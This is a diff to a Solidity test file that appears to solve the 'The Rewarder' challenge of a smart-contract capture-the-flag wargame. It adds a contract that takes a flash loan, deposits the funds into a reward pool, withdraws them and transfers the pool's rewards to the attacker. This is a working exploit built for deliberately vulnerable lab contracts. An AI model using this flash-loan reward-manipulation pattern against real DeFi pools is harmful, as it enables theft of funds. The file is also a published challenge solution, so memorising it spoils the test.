@@ -89,6 +89,17 @@ contract TheRewarder is Test {
          * EXPLOIT START *
          */
 
+        vm.warp(block.timestamp + 5 days);
+
+        vm.startPrank(attacker);
+
+        TheRewarderExploit exploit = new TheRewarderExploit(address(flashLoanerPool), address(theRewarderPool), address(attacker));
+
+        vm.label(address(exploit), "EXPLOIT");
+        exploit.attack();
+
+        vm.stopPrank();
+
         /**
          * EXPLOIT END *
          */
@@ -116,5 +127,34 @@ contract TheRewarder is Test {
 
         // Attacker finishes with zero DVT tokens in balance
         assertEq(dvt.balanceOf(attacker), 0);
+    }
+}
+
+contract TheRewarderExploit {
+
+    DamnValuableToken public immutable liquidityToken;
+    TheRewarderPool public immutable theRewarderPool;
+    FlashLoanerPool public immutable flashLoanerPool;
+    RewardToken public immutable rewardToken;
+    address public immutable attacker;
+    
+    constructor(address flashLoanerPoolAddress, address theRewarderPoolAddress, address attackerAddress) {
+        theRewarderPool = TheRewarderPool(theRewarderPoolAddress);
+        flashLoanerPool = FlashLoanerPool(flashLoanerPoolAddress);
+        liquidityToken = theRewarderPool.liquidityToken();
+        rewardToken = theRewarderPool.rewardToken();
+        attacker = attackerAddress;
+    } 
+
+    function attack() public {
+        flashLoanerPool.flashLoan(1_000_000e18);
+    }
+
+    function receiveFlashLoan(uint256 amount) external payable {
+        liquidityToken.approve(address(theRewarderPool), amount);
+        theRewarderPool.deposit(amount);
+        theRewarderPool.withdraw(amount);
+        liquidityToken.transfer(msg.sender, amount);
+        rewardToken.transfer(attacker, rewardToken.balanceOf(address(this)));
     }
 }
